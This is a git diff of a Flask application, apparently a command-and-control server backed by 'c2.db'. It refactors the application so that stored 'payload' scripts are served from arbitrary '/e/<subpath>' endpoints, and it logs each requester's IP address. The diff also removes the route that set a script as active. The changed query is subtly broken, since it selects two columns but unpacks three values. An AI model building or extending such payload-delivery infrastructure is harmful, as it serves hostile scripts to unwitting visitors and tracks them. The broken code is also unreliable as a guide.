@@ -9,20 +9,20 @@ from flask import make_response, render_template, request, session, jsonify
 from .support import check_auth
 
 
-@app.route("/<id>/serve.js", methods=["GET"])
-def serve(id):
+@app.route('/e/<path:subpath>', methods=['GET', 'POST', 'PUT', 'DELETE'])
+def serve(subpath):
     resp = make_response()
     connection = sqlite3.connect("db/c2.db")
     cursor = connection.cursor()
     try:
-        owner = cursor.execute(
-            """SELECT uuid FROM users WHERE identifier = ?""", (id,)
+        payload_uuid = cursor.execute(
+            """SELECT payload FROM endpoints WHERE identifier = ?""", (subpath,)
         ).fetchall()[0][0]
     except IndexError:
         resp.status = "500"
         return resp
-    script, script_name = cursor.execute(
-        """SELECT script,name FROM scripts WHERE active = 1 AND owner = ?;""", (owner,)
+    payload, payload_name, owner = cursor.execute(
+        """SELECT script,name FROM scripts WHERE uuid = ?;""", (payload_uuid,)
     ).fetchall()[0]
     cursor.execute(
         """INSERT INTO data (uuid, time_stamp, remote_ip, method, received, owner) VALUES (?, ?, ?, ?, ? ,?);""",
@@ -31,7 +31,7 @@ def serve(id):
             str(datetime.fromtimestamp(time()).strftime("%Y-%m-%d %H:%M:%S")),
             str(request.remote_addr),
             "GET",
-            "Fetched script titled '%s'" % script_name,
+            "Fetched script titled '%s'" % payload_name,
             owner,
         ),
     )  # Log this in 'interactions'
@@ -44,7 +44,7 @@ def serve(id):
     return resp
 
 
-@app.route("/script/data", methods=["GET"])
+@app.route("/endpoint/data", methods=["GET"])
 @check_auth
 def serve_script_content():
     connection = sqlite3.connect("db/c2.db")
@@ -63,31 +63,7 @@ def serve_script_content():
     return jsonify(data)
 
 
-@app.route("/script/active", methods=["GET"])
-@check_auth
-def set_script_active():
-    connection = sqlite3.connect("db/c2.db")
-    cursor = connection.cursor()
-    id = request.args.get("id", default="", type=str)
-    owner = cursor.execute(
-        """SELECT uuid FROM users WHERE username = ?;""", (session["name"],)
-    ).fetchall()[0][0]
-    cursor.execute(
-        """UPDATE scripts SET active = 0 WHERE owner = ?;""",
-        (owner,),
-    )
-    cursor.execute(
-        """UPDATE scripts SET active = 1 WHERE uuid = ?;""",
-        (id,),
-    )
-
-    data = {"response_text": "Activated!", "colour": "#089305"}
-    connection.commit()
-    connection.close()
-    return jsonify(data)
-
-
-@app.route("/script/save", methods=["POST"])
+@app.route("/endpoint/save", methods=["POST"])
 @check_auth
 def save_script():
     connection = sqlite3.connect("db/c2.db")
@@ -138,10 +114,10 @@ def script():
         """SELECT uuid FROM users WHERE username = ?;""", (session["name"],)
     ).fetchall()[0][0]
 
-    scripts = cursor.execute(
-        """SELECT name,uuid FROM scripts WHERE owner = ? ORDER BY active;""", (owner,)
+    endpoints = cursor.execute(
+        """SELECT endpoint,uuid FROM endpoints WHERE owner = ?;""", (owner,)
     ).fetchall()
-    scripts.reverse()
+    endpoints.reverse()
     connection.close()
     host_header = request.headers.get("Host")
-    return render_template("script_edit.html", content=scripts, host=host_header)
+    return render_template("endpoints.html", content=endpoints, host=host_header)
